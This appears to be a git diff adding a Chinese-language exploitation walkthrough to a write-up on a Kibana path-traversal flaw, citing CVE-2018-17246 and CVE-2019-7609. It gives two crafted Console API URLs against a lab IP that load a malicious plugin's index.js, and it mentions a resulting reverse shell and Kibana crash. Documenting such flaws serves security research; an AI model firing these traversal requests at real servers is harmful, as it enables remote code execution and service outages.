@@ -82,6 +82,33 @@ https://github.com/outbrain/ob-kb-percent/issues/7
 ![image](https://user-images.githubusercontent.com/30398606/161003301-b4029b69-54d8-45cf-8918-2ea3f0ad511d.png)
 
 
+### 利用过程
+0、准备恶意插件：
+
+
+
+
+
+
+
+1、设置payload：
+
+
+2、触发下载插件：
+http://192.168.17.128:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../cli_plugin/cli.js
+
+
+
+
+3、触发Kibana加载插件，执行恶意的index.js
+http://192.168.17.128:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../plugins/synacktiv/index.js
+![image](https://user-images.githubusercontent.com/30398606/161235363-3c99ed01-1a6a-4311-99bc-32ea44bbe370.png)
+
+
+![image](https://user-images.githubusercontent.com/30398606/161235216-0dc772bb-6de5-4f4a-addf-8025a32e36cf.png)
+
+利用有风险，很多地方都能把kibana给弄挂。这里反弹shell结束之后，kibana就挂了。
+
 ## Ref
 - https://github.com/mpgn/CVE-2019-7609
 - https://github.com/mpgn/CVE-2018-17246
